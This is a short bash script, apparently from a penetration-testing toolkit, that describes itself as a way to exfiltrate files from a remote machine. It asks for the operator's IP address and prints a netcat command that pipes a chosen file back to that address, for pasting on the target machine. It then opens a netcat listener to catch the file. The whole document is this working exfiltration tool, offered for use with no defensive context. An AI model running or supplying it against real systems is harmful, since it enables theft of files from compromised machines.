#! /bin/bash
# --------------- INFO ---------------
#
# download.sh script: Exfiltrate files from a remote machine to this one
#
# --------------- CODE ---------------

# Checks if no arguments are given
if [ $# != 2 ]; then
        echo "Usage: download <file to download> <port to use>"
        exit
fi

file="$1"
port=$2

# LHOST configuration
sudo ifconfig
echo -n "Your IP address (only supports IPv4): "
read address

# Command generation
command="nc $address $port < $1"
echo
echo "Paste on the target:"
echo "$command"
echo

# Server opening
echo "When the transfer is finished, press Ctrl + C to kill the server"
echo "[INFO] Server starting now"
nc -lvp $port > $1
